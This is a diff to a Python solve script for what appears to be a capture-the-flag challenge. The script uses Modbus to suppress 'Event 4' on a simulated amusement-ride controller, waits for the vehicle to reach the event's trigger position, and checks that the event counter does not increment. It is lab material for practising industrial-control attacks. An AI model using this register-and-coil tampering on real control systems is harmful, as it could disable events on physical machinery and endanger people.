@@ -69,20 +69,61 @@ def main():
         sys.exit(1)
 
     print("[+] Event 4 disabled successfully!")
-    print("[*] Holding for 3 seconds to complete challenge...")
+    print("[*] Waiting for vehicle to reach Event 4 zone (position 9)...")
+    print("[*] This will verify the event is suppressed when it should trigger")
 
-    # Hold for 3 seconds
-    for i in range(3):
-        time.sleep(1)
-        # Verify it's still disabled
-        verify = client.read_coils(11, 1)
-        if not verify.isError():
-            status = "DISABLED" if not verify.bits[0] else "ENABLED"
-            print(f"[*] Event 4 status: {status}")
+    # Wait for vehicle to enter Event 4 zone
+    event_zone_reached = False
+    last_position = -1
+    timeout = 60  # 60 second timeout
+    start_time = time.time()
 
-    print("\n[+] Challenge condition met!")
-    print("[*] Event 4 disabled while ride is running")
-    print("[*] Check the web interface for flag capture notification")
+    while not event_zone_reached and (time.time() - start_time) < timeout:
+        # Read current position
+        pos_result = client.read_holding_registers(1, 1)  # current_position
+        if not pos_result.isError():
+            current_pos = pos_result.registers[0]
+
+            # Print position updates
+            if current_pos != last_position:
+                print(f"\r[*] Vehicle position: {current_pos}", end="", flush=True)
+                last_position = current_pos
+
+            # Event 4 triggers at position 9
+            if current_pos == 9:
+                event_zone_reached = True
+                print(f"\n[+] Vehicle reached Event 4 zone (position {current_pos})!")
+
+                # Verify event is still disabled
+                verify = client.read_coils(11, 1)
+                if not verify.isError() and not verify.bits[0]:
+                    print("[+] Event 4 is DISABLED - flash will not trigger!")
+
+                    # Check the event counter to confirm it doesn't increment
+                    counter_before = client.read_holding_registers(1047, 1)  # event_4_counter
+                    time.sleep(2)  # Wait while in zone
+                    counter_after = client.read_holding_registers(1047, 1)
+
+                    if not counter_before.isError() and not counter_after.isError():
+                        before = counter_before.registers[0]
+                        after = counter_after.registers[0]
+                        print(f"[*] Event 4 counter: {before} -> {after}")
+
+                        if after == before:
+                            print("[+] Event successfully suppressed - counter did not increment!")
+
+                    print("\n[+] Challenge condition met!")
+                    print("[*] Event 4 was disabled when vehicle entered its trigger zone")
+                    print("[*] Check the web interface for flag capture notification")
+                else:
+                    print("[!] Event 4 was re-enabled - challenge may not complete")
+                break
+
+        time.sleep(0.2)
+
+    if not event_zone_reached:
+        print("\n[!] Timeout waiting for vehicle to reach Event 4 zone")
+        print("[!] Make sure the ride is running and try again")
 
     client.close()
 
